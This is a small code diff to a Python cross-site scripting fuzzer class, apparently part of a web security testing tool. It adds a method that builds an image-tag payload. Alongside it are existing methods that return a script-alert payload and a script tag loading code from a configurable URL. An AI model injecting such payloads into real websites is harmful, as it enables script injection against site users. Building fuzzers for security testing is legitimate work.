@@ -19,6 +19,10 @@ class XSS(Fuzzer):
     def alterTest(self, p=False):
         return "<script>alert(/xss/)</script>"
 
+    def img(self):
+        payload = "<img src='%s'></img>" % self.url
+        return payload
+
     def script(self):
         payload = "<script src='%s'></script>" % self.url
         return payload
